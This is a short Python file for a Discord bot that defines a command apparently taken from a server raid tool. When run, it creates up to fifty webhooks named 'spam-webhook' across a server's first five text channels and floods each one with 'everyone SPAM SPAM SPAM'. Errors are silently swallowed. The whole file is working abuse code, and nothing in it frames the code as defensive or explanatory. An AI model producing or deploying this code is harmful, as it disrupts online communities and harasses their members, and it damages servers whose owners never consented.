import discord
import asyncio

async def _9(ctx):
    if not ctx.guild.me.guild_permissions.manage_webhooks:
        await ctx.send("BOT NEEDS MANAGE WEBHOOKS PERMISSION", delete_after=3)
        return
    await ctx.send("CREATING WEBHOOKS", delete_after=2)
    channels = ctx.guild.text_channels
    webhooks = []
    for channel in channels[:5]:
        for i in range(10):
            try:
                webhook = await channel.create_webhook(name="spam-webhook")
                webhooks.append(webhook)
            except:
                pass
    for webhook in webhooks:
        try:
            await webhook.send("everyone SPAM SPAM SPAM")
        except:
            pass
    await ctx.send(f"SPAMMED {len(webhooks)} WEBHOOKS")
